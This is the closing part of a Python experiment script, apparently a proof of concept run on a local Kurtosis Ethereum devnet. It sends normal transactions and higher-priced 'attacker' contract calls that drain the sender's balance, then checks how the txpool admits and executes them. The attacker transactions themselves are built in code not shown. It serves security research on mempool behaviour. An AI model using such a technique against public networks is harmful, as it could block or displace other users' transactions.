    print(f"  A receipts: {[receipt is not None for receipt in a_receipts]}")
    print(f"  xBalanceWei={x_balance}")
    print(f"  aBalanceWei={a_balance}")
    print(f"  contractBalanceWei={contract_balance}")
    print(f"  nextXUpfrontCostWei={upfront_cost}")
    if x_statuses[0] == "0x1" and x_statuses[1:] == [None, None, None] and contract_balance == 0 and x_balance < upfront_cost:
        print("PASS: X1 forwards its own msg.value; X2-X4 were txpool-valid but cannot execute after x balance is exhausted")
    else:
        print("CHECK: execution statuses differ from the expected sender-balance-exhaustion pattern")


def main():
    args = parse_args()
    exp_dir = Path(__file__).resolve().parent
    accounts = load_key_csv(exp_dir / "key_prive_exp5.csv")
    rpc_url = args.rpc or discover_kurtosis_rpc(args.enclave)
    args.rpc_url = rpc_url
    rpc = RpcClient(rpc_url)
    chain_id = hex_to_int(rpc.call("eth_chainId"))
    client = rpc.call("web3_clientVersion")

    print(f"RPC: {rpc_url}")
    print(f"client={client}")
    print(f"chainId={chain_id}")
    print(f"case={args.case}")
    print(f"block={hex_to_int(rpc.call('eth_blockNumber'))}")
    print("accounts before setup:")
    for label in (DEFAULT_FUNDER["label"], "a", "x"):
        account = accounts[label]
        print(f"  {label:<7} {account['address']} balanceWei={balance(rpc, account['address'])}")

    status = rpc.call("txpool_status")
    if hex_to_int(status["pending"]) or hex_to_int(status["queued"]):
        print(f"warning: txpool is not empty before setup: {status}")

    fund_accounts(rpc, chain_id, accounts, args)
    contract_address = deploy_contract(rpc, chain_id, accounts, args)

    print("\naccounts after setup:")
    for label in ("a", "x"):
        account = accounts[label]
        print(f"  {label:<7} {account['address']} balanceWei={balance(rpc, account['address'])}")

    wait_fresh_block(rpc, args.fresh_block_timeout)
    a_start_nonce = hex_to_int(rpc.call("eth_getTransactionCount", [accounts["a"]["address"], "pending"]))
    x_start_nonce = hex_to_int(rpc.call("eth_getTransactionCount", [accounts["x"]["address"], "pending"]))
    normal = build_normal(accounts, a_start_nonce, args.normal_price)
    attacker = build_attacker(accounts, contract_address, x_start_nonce, args.attacker_price, args.call_gas, args)
    workload_price_unit = sender_workload_price_unit(args)
    known = []

    print("\n========== workload: send A1-A4 then X1-X4 before next PoS slot ==========")
    if is_sender_balance_case(args.case):
        print(f"senderTargetBalanceWei={sender_target_balance(args)}")
        print(f"forwardValueWei={args.forward_value_eth * ETHER}")
        print(f"senderGasCapWei={args.sender_gas_cap_eth * ETHER}")
        print(f"workloadPriceUnitWei={workload_price_unit}")
    for tx in normal:
        known.append(send(rpc, chain_id, accounts, tx, workload_price_unit))
    locations = snapshot(rpc, "after filling A1-A4 price=3", known)

    for tx in attacker:
        known.append(send(rpc, chain_id, accounts, tx, workload_price_unit))
    value_desc = f"value={args.forward_value_eth} ETH" if is_sender_balance_case(args.case) else "value=0"
    locations = snapshot(rpc, f"after X1-X4 contract calls price=7 {value_desc}", known)
    if is_sender_balance_case(args.case):
        print_sender_pool_result(normal, attacker, locations)
    else:
        print_pool_result(normal, attacker, locations)
    print(f"contractBalanceWeiBeforeReceipts={balance(rpc, contract_address)}")

    print("\n========== wait for PoS receipts ==========")
    if is_sender_balance_case(args.case):
        wait_targets(rpc, [attacker[0]], args.receipt_timeout)
        time.sleep(1)
    else:
        wait_targets(rpc, attacker, args.receipt_timeout)
    snapshot(rpc, "after PoS block production", known)
    if is_sender_balance_case(args.case):
        print_sender_balance_result(normal, attacker, contract_address, rpc, accounts, args, workload_price_unit)
    else:
        print_execution_result(normal, attacker, contract_address, rpc, args)
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except (RpcError, RuntimeError) as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        sys.exit(1)
